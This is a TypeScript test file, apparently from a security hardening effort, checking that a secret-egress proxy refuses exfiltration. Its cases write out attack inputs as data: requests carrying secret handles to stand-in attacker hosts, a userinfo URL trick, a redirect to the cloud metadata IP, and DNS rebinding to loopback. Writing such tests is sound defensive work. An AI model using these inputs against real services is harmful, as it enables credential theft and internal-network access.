import type { AppDataAccess } from "../app-data.js";
import type { AppDocument, SecretsProvider, ToolRegistry } from "@vendoai/core";
import { describe, expect, it, vi } from "vitest";
import { createAppsProxy } from "../proxy.js";
import { mintRunToken } from "../run-token.js";
import type { IpResolver } from "../ssrf.js";

// ============================================================================
// ENG-259 adversarial suite for the FUNCTIONAL secret-egress proxy (06-apps §4.3).
//
// The proxy /egress route is the one controlled point where a declared secret
// handle becomes a real value. Every case here is an attack: get the real secret
// to a host the adversary controls, or reach an internal address. All must FAIL
// CLOSED — refuse, with no substitution and no forward. Delete a guard and the
// matching case here goes red (revert-to-fail).
// ============================================================================

const SECRET = "sk_live_REAL_SECRET_VALUE";
const tokenSecret = new TextEncoder().encode("egress-proxy-test-secret-key-0001");

const appDoc = (over: Partial<AppDocument>): AppDocument =>
  ({ format: "vendo/app@1", id: "app_egress", name: "Egress app", ...over }) as AppDocument;

const noopData = {} as AppDataAccess;
const noopTools: ToolRegistry = {
  async descriptors() { return []; },
  async execute() { return { status: "blocked", reason: "unused" }; },
};

interface Harness {
  handler(request: Request): Promise<Response>;
  token: string;
  fetchMock: ReturnType<typeof vi.fn>;
  get: ReturnType<typeof vi.fn>;
}

const publicResolver: IpResolver = async () => ["93.184.216.34"];

const makeHarness = async (options: {
  app: AppDocument;
  fetchImpl?: (input: string, init?: RequestInit) => Promise<Response>;
  resolveIp?: IpResolver;
  secretValue?: string | undefined;
} ): Promise<Harness> => {
  const get = vi.fn(async (): Promise<string | undefined> => options.secretValue ?? SECRET);
  const secrets: SecretsProvider = { get };
  const fetchMock = vi.fn(options.fetchImpl ?? (async () =>
    new Response(JSON.stringify({ ok: true }), { status: 200, headers: { "content-type": "application/json" } })));
  const proxy = createAppsProxy({
    tokenSecret,
    tools: noopTools,
    data: noopData,
    owns: async () => true,
    loadApp: async () => options.app,
    secrets,
    fetch: fetchMock as unknown as typeof globalThis.fetch,
    resolveIp: options.resolveIp ?? publicResolver,
  });
  const token = await mintRunToken(tokenSecret, {
    appId: options.app.id,
    subject: "user_ada",
    runId: "run_egress",
    presence: "present",
    expiresAt: Date.now() + 60_000,
    jti: "jti_egress",
  });
  return { handler: proxy.handler, token, fetchMock, get };
};

const egress = (token: string, envelope: unknown): Request =>
  new Request("https://proxy.test/egress", {
    method: "POST",
    headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
    body: JSON.stringify(envelope),
  });

const handleFor = (name: string): string => `vendo-secret:${name}:deadbeef`;

describe("egress proxy — allowlisted secret substitution (happy path)", () => {
  it("substitutes a declared secret toward an allowlisted host and forwards, redacting reflections", async () => {
    const reflected = async (_input: string, init?: RequestInit): Promise<Response> =>
      // A reflecting endpoint echoes the Authorization header back — the proxy must strip it.
      new Response(JSON.stringify({ echoed: (init?.headers as Record<string, string>).authorization }), {
        status: 200,
        headers: { "content-type": "application/json", "x-echo": (init?.headers as Record<string, string>).authorization },
      });
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }), fetchImpl: reflected });

    const response = await h.handler(egress(h.token, {
      url: "https://api.stripe.com/v1/charges",
      method: "POST",
      headers: { authorization: `Bearer ${handleFor("STRIPE_KEY")}` },
      body: `amount=100`,
    }));
    expect(response.status).toBe(200);

    // The forwarded request carried the REAL secret to the allowlisted host.
    expect(h.fetchMock).toHaveBeenCalledTimes(1);
    const forwardedHeaders = h.fetchMock.mock.calls[0][1].headers as Record<string, string>;
    expect(forwardedHeaders.authorization).toBe(`Bearer ${SECRET}`);
    expect(h.get).toHaveBeenCalledWith("STRIPE_KEY");

    // The reflected secret is stripped on the way back to app code.
    const envelope = await response.json() as { status: number; headers: Record<string, string>; body: string };
    expect(JSON.stringify(envelope)).not.toContain(SECRET);
    expect(envelope.body).toContain("[vendo-secret-redacted]");
    expect(envelope.headers["x-echo"]).toBe("Bearer [vendo-secret-redacted]");
  });
});

describe("egress proxy — exfiltration attempts fail closed", () => {
  it("refuses a non-allowlisted host with NO substitution and NO forward", async () => {
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }) });
    const response = await h.handler(egress(h.token, {
      url: "https://evil.attacker.test/collect",
      method: "POST",
      headers: { authorization: `Bearer ${handleFor("STRIPE_KEY")}` },
    }));
    expect(response.status).toBe(403);
    expect(h.fetchMock).not.toHaveBeenCalled();
    expect(h.get).not.toHaveBeenCalled(); // secret never even read
  });

  it("blocks the userinfo trick https://api.stripe.com@evil.com → evil.com refused", async () => {
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }) });
    const response = await h.handler(egress(h.token, {
      url: "https://api.stripe.com@evil.com/collect",
      headers: { authorization: `Bearer ${handleFor("STRIPE_KEY")}` },
    }));
    expect(response.status).toBe(403);
    expect(h.fetchMock).not.toHaveBeenCalled();
    expect(h.get).not.toHaveBeenCalled();
  });

  it("blocks a redirect from an allowlisted host to an internal IP", async () => {
    const redirecter: IpResolver = async (host) => (host === "api.stripe.com" ? ["93.184.216.34"] : ["10.0.0.5"]);
    const fetchImpl = async (input: string): Promise<Response> => {
      if (input.includes("api.stripe.com")) {
        return new Response(null, { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data/" } });
      }
      return new Response("SHOULD NOT REACH", { status: 200 });
    };
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }), fetchImpl, resolveIp: redirecter });
    const response = await h.handler(egress(h.token, {
      url: "https://api.stripe.com/v1/charges",
      headers: { authorization: `Bearer ${handleFor("STRIPE_KEY")}` },
    }));
    expect(response.status).toBe(403);
    // The first hop was attempted; the redirect target (metadata IP) was refused before a second fetch.
    expect(h.fetchMock).toHaveBeenCalledTimes(1);
  });

  it("blocks DNS rebind: an allowlisted host that resolves to loopback is refused", async () => {
    const rebind: IpResolver = async () => ["127.0.0.1"]; // allowlisted name, private answer
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }), resolveIp: rebind });
    const response = await h.handler(egress(h.token, {
      url: "https://api.stripe.com/v1/charges",
      headers: { authorization: `Bearer ${handleFor("STRIPE_KEY")}` },
    }));
    expect(response.status).toBe(403);
    expect(h.fetchMock).not.toHaveBeenCalled();
    expect(h.get).not.toHaveBeenCalled();
  });

  it("does not leak a handle hidden in the query string toward a non-allowlisted host", async () => {
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }) });
    const response = await h.handler(egress(h.token, {
      url: `https://evil.attacker.test/x?leak=${handleFor("STRIPE_KEY")}`,
    }));
    expect(response.status).toBe(403);
    expect(h.fetchMock).not.toHaveBeenCalled();
  });

  it("does not substitute a handle in the URL query even toward an allowlisted host (URL is never rewritten)", async () => {
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }) });
    await h.handler(egress(h.token, {
      url: `https://api.stripe.com/x?leak=${handleFor("STRIPE_KEY")}`,
    }));
    expect(h.fetchMock).toHaveBeenCalledTimes(1);
    const forwardedUrl = h.fetchMock.mock.calls[0][0] as string;
    expect(forwardedUrl).toContain(handleFor("STRIPE_KEY"));
    expect(forwardedUrl).not.toContain(SECRET);
  });

  it("does not resolve a handle for a secret the app did not declare", async () => {
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }) });
    await h.handler(egress(h.token, {
      url: "https://api.stripe.com/v1",
      headers: { authorization: `Bearer ${handleFor("OTHER_SECRET")}` },
    }));
    expect(h.get).not.toHaveBeenCalledWith("OTHER_SECRET");
    const forwardedHeaders = h.fetchMock.mock.calls[0][1].headers as Record<string, string>;
    expect(forwardedHeaders.authorization).toBe(`Bearer ${handleFor("OTHER_SECRET")}`); // left as an opaque handle
  });
});

describe("egress proxy — fail-safe limits and auth", () => {
  it("rejects an oversized egress request body", async () => {
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }) });
    const response = await h.handler(egress(h.token, {
      url: "https://api.stripe.com/v1",
      body: "x".repeat(1024 * 1024 + 1),
    }));
    expect(response.status).toBe(400);
    expect(h.fetchMock).not.toHaveBeenCalled();
  });

  it("truncates an oversized response body and never leaks the secret", async () => {
    const huge = `${SECRET}${"y".repeat(5 * 1024 * 1024)}`;
    const fetchImpl = async (): Promise<Response> => new Response(huge, { status: 200 });
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }), fetchImpl });
    const response = await h.handler(egress(h.token, {
      url: "https://api.stripe.com/v1",
      headers: { authorization: `Bearer ${handleFor("STRIPE_KEY")}` },
    }));
    const envelope = await response.json() as { body: string };
    expect(envelope.body.length).toBeLessThanOrEqual(4 * 1024 * 1024);
    expect(envelope.body).not.toContain(SECRET);
  });

  it("rejects an unauthenticated egress request", async () => {
    const h = await makeHarness({ app: appDoc({ egress: ["api.stripe.com"], secrets: ["STRIPE_KEY"] }) });
    const response = await h.handler(new Request("https://proxy.test/egress", {
      method: "POST",
      headers: { authorization: "Bearer forged.token", "content-type": "application/json" },
      body: JSON.stringify({ url: "https://api.stripe.com/v1" }),
    }));
    expect(response.status).toBe(401);
    expect(h.fetchMock).not.toHaveBeenCalled();
  });

  it("refuses egress when the app declares no allowlist (fail closed)", async () => {
    const h = await makeHarness({ app: appDoc({ secrets: ["STRIPE_KEY"] }) }); // egress undefined
    const response = await h.handler(egress(h.token, {
      url: "https://api.stripe.com/v1",
      headers: { authorization: `Bearer ${handleFor("STRIPE_KEY")}` },
    }));
    expect(response.status).toBe(403);
    expect(h.fetchMock).not.toHaveBeenCalled();
    expect(h.get).not.toHaveBeenCalled();
  });
});
